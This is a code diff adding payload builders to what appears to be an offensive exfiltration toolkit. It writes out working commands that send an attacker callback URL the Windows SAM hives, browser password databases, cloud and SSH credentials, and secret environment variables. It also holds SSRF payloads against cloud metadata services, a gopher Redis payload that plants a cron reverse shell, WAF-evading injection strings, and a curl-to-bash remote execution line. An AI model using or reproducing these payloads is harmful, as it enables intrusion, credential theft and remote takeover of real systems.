@@ -364,3 +364,178 @@ export function buildDnsExfil(cbUrl: string, token: string): ExfilPayload[] {
     },
   ];
 }
+
+/* ════════════════════════════════════════════════════════════════════════════
+   EXTENDED EXFIL: Windows, SSRF, injection-ready wrappers
+   ════════════════════════════════════════════════════════════════════════════ */
+
+/* ── Windows Exfiltration ─────────────────────────────────────────────────── */
+export function buildWindowsExfil(cbUrl: string, token: string): ExfilPayload[] {
+  const cb = `${cbUrl}/${token}`;
+  return [
+    {
+      id: "win_sysinfo", name: "Windows System Info", category: "Recon",
+      technique: "https", os: "windows",
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "$b=(systeminfo+whoami+ipconfig /all|Out-String);Invoke-WebRequest -Uri '${cb}?f=win_sys' -Method POST -Body $b"`,
+      notes: "Exfiltrates systeminfo, whoami, ipconfig in one PowerShell command.",
+    },
+    {
+      id: "win_env_secrets", name: "Windows Secret ENV Vars", category: "Secrets",
+      technique: "https", os: "windows",
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "$s=([Environment]::GetEnvironmentVariables()|Out-String|Select-String -Pattern '(pass|secret|key|token|api|cred|db|jwt|bearer|azure|aws|gcp)' -AllMatches).Matches.Value -join '\n';iwr '${cb}?f=win_secrets' -Method POST -Body $s"`,
+      notes: "Filters Windows env for secret patterns and exfiltrates.",
+    },
+    {
+      id: "win_sam_dump", name: "Windows SAM+SYSTEM Dump Hint", category: "Credentials",
+      technique: "https", os: "windows",
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "reg save HKLM\\SAM $env:TEMP\\s.hiv /y;reg save HKLM\\SYSTEM $env:TEMP\\sy.hiv /y;$b=[IO.File]::ReadAllBytes($env:TEMP+'\\s.hiv');iwr '${cb}?f=win_sam' -Method POST -Body $b"`,
+      notes: "Saves SAM+SYSTEM hive then exfiltrates as binary. Requires SYSTEM privileges.",
+    },
+    {
+      id: "win_creds_mgr", name: "Windows Credential Manager", category: "Credentials",
+      technique: "https", os: "windows",
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "$c=cmdkey /list 2>&1|Out-String;$v=(Get-StoredCredential -AsCredentialObject 2>&1)|Out-String;iwr '${cb}?f=win_creds' -Method POST -Body ($c+$v)"`,
+      notes: "Dumps Windows Credential Manager entries.",
+    },
+    {
+      id: "win_browser_creds", name: "Chrome/Edge Saved Passwords", category: "Credentials",
+      technique: "https", os: "windows",
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "$p=@('$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data','$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data');foreach($f in $p){if(Test-Path $f){$b=[IO.File]::ReadAllBytes($f);iwr '${cb}?f=browsers' -Method POST -Body $b}}"`,
+      notes: "Copies Chrome/Edge Login Data SQLite files for offline decryption.",
+    },
+    {
+      id: "win_aws_keys", name: "Windows AWS Credentials", category: "Cloud",
+      technique: "https", os: "windows",
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "$f='$env:USERPROFILE\\.aws\\credentials';if(Test-Path $f){iwr '${cb}?f=aws_creds' -Method POST -Body (Get-Content $f -Raw)}"`,
+      notes: "AWS CLI credentials file on Windows.",
+    },
+    {
+      id: "win_azure_token", name: "Windows Azure Token", category: "Cloud",
+      technique: "https", os: "windows",
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "$t=iwr 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/' -H @{Metadata='true'};iwr '${cb}?f=azure_token' -Method POST -Body $t.Content"`,
+      notes: "Azure IMDS managed identity token.",
+    },
+    {
+      id: "win_ssh_keys", name: "Windows SSH Private Keys", category: "Credentials",
+      technique: "https", os: "windows",
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "Get-ChildItem -Path $env:USERPROFILE\\.ssh,$env:PROGRAMDATA\\ssh -Filter id_* -Recurse -EA 0|%{iwr '${cb}?f=ssh_keys_win' -Method POST -Body (Get-Content $_.FullName -Raw -EA 0)}"`,
+      notes: "Finds SSH private keys in user and system SSH dirs on Windows.",
+    },
+    {
+      id: "win_recon_full", name: "Full Windows Recon + Exfil", category: "Recon",
+      technique: "https", os: "windows",
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "$r=(whoami /all;ipconfig /all;netstat -an;tasklist;net user;net localgroup administrators;systeminfo;wmic product get name,version)|Out-String;iwr '${cb}?f=win_full_recon' -Method POST -Body $r"`,
+      notes: "Full Windows recon: users, groups, network, processes, software. Admin-safe.",
+    },
+  ];
+}
+
+/* ── SSRF-based exfiltration ─────────────────────────────────────────────── */
+export function buildSsrfExfil(cbUrl: string, token: string): ExfilPayload[] {
+  const cb = `${cbUrl}/${token}`;
+  return [
+    {
+      id: "ssrf_aws_imds", name: "SSRF → AWS IMDSv1 Creds", category: "Cloud",
+      technique: "http", os: "any",
+      command: `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`,
+      notes: "SSRF target URL for AWS IMDSv1. Replace ROLE_NAME with discovered IAM role. Returns temp credentials.",
+    },
+    {
+      id: "ssrf_aws_imdsv2", name: "SSRF → AWS IMDSv2 Token (step 1)", category: "Cloud",
+      technique: "http", os: "any",
+      command: `curl -sk -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`,
+      notes: "IMDSv2 step 1: PUT request to get the metadata token. Use the returned token in step 2.",
+    },
+    {
+      id: "ssrf_gcp_imds", name: "SSRF → GCP SA OAuth Token", category: "Cloud",
+      technique: "http", os: "any",
+      command: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
+      notes: "GCP SSRF target. Requires 'Metadata-Flavor: Google' header. Returns live OAuth access_token.",
+    },
+    {
+      id: "ssrf_azure_imds", name: "SSRF → Azure IMDS Token", category: "Cloud",
+      technique: "http", os: "any",
+      command: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/`,
+      notes: "Azure SSRF target. Requires 'Metadata: true' header. Returns ARM API access_token.",
+    },
+    {
+      id: "ssrf_docker_api", name: "SSRF → Docker API (containers list)", category: "Container",
+      technique: "http", os: "any",
+      command: `http://localhost:2375/containers/json`,
+      notes: "Docker API unauthenticated endpoint. Lists running containers with IDs and images.",
+    },
+    {
+      id: "ssrf_k8s_api", name: "SSRF → K8s API (cluster info)", category: "Container",
+      technique: "http", os: "any",
+      command: `https://kubernetes.default.svc/api/v1/namespaces`,
+      notes: "K8s internal API server. Use SA token in Authorization header to enumerate resources.",
+    },
+    {
+      id: "ssrf_redis", name: "SSRF → Redis (config dump)", category: "Credentials",
+      technique: "http", os: "any",
+      command: `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$59%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a`,
+      notes: "Gopher protocol SSRF → Redis RCE via cron injection. Replace ATTACKER_IP.",
+    },
+    {
+      id: "ssrf_memcached", name: "SSRF → Memcached (stats + keys)", category: "Credentials",
+      technique: "http", os: "any",
+      command: `gopher://127.0.0.1:11211/_stats%0d%0a`,
+      notes: "SSRF to Memcached via Gopher. Retrieves server stats and cached key names.",
+    },
+    {
+      id: "ssrf_internal_scan", name: "SSRF → Internal Network Probe", category: "Recon",
+      technique: "http", os: "any",
+      command: `http://192.168.1.1/ http://10.0.0.1/ http://172.16.0.1/`,
+      notes: "Common internal gateway addresses to probe via SSRF. Check for admin panels.",
+    },
+    {
+      id: "ssrf_file_read", name: "SSRF → file:// Local File Read", category: "File Read",
+      technique: "http", os: "any",
+      command: `file:///etc/passwd file:///etc/shadow file:///proc/self/environ`,
+      notes: "file:// scheme SSRF for LFI via SSRF. Works in some SSRF scenarios (Java, PHP with allow_url_fopen).",
+    },
+  ];
+}
+
+/* ── Injection-ready exfil (works inside HTTP injection param directly) ── */
+export function buildInjectionReadyExfilWrapped(cbUrl: string, token: string): ExfilPayload[] {
+  const cb = `${cbUrl}/${token}`;
+  return [
+    {
+      id: "inj_ready_passwd", name: "✦ INJECT-READY: /etc/passwd → OOB", category: "Injection-Ready",
+      technique: "http", os: "linux",
+      command: `$(curl -sk -X POST "${cb}?f=passwd" --data-binary @/etc/passwd)`,
+      notes: "Drop directly into injection param (e.g. ?cmd=PAYLOAD). No pre-existing shell needed.",
+    },
+    {
+      id: "inj_ready_env", name: "✦ INJECT-READY: ENV Secrets → OOB", category: "Injection-Ready",
+      technique: "http", os: "linux",
+      command: `$(env|grep -iE '(pass|secret|key|token|api|cred|jwt|bearer)'|curl -sk -X POST "${cb}?f=env" --data-binary @-)`,
+      notes: "Inject directly: exfiltrates all secret env vars via OOB HTTP.",
+    },
+    {
+      id: "inj_ready_sysinfo", name: "✦ INJECT-READY: Full Recon → OOB", category: "Injection-Ready",
+      technique: "http", os: "linux",
+      command: `$((id;uname -a;hostname;cat /proc/self/environ|tr '\\0' '\\n'|grep -iE '(pass|key|token|secret)';df -h;ps aux|head -5)|curl -sk -X POST "${cb}?f=recon" --data-binary @-)`,
+      notes: "One-injection full recon + secret env exfil. Returns status in web response.",
+    },
+    {
+      id: "inj_ready_ifs", name: "✦ INJECT-READY (IFS bypass): ENV → OOB", category: "Injection-Ready",
+      technique: "http", os: "linux",
+      command: `$(env|grep${" -iE".replace(/ /g,"${IFS}")}${" '(pass|secret|key|token)'")|curl${" -sk".replace(/ /g,"${IFS}")}${" -X".replace(/ /g,"${IFS}")}${" POST".replace(/ /g,"${IFS}")}${" ".replace(/ /g,"${IFS}")}${`"${cb}?f=ifs_env"`}${" --data-binary".replace(/ /g,"${IFS}")}${" @-".replace(/ /g,"${IFS}")})`,
+      notes: "IFS-bypassed version for WAFs that block spaces in injection params.",
+    },
+    {
+      id: "inj_ready_b64", name: "✦ INJECT-READY (B64 bypass): Full Exfil", category: "Injection-Ready",
+      technique: "http", os: "linux",
+      command: `$({echo,${Buffer.from(`(id;hostname;cat /proc/self/environ|tr '\\0' '\\n')|curl -sk -X POST "${cb}?f=b64_exfil" --data-binary @-`).toString('base64')}}|{base64,-d}|{bash,})`,
+      notes: "Base64-encoded injection — bypasses keyword-based WAFs.",
+    },
+    {
+      id: "inj_ready_curl_pipe", name: "✦ INJECT-READY: Curl-Pipe Remote Exec", category: "Injection-Ready",
+      technique: "http", os: "linux",
+      command: `$(curl -fsSL "${cb}/sh" 2>/dev/null|bash)`,
+      notes: "Fetches and executes your hosted shell script. Host a reverse shell or implant at the OOB callback /sh.",
+    },
+  ];
+}
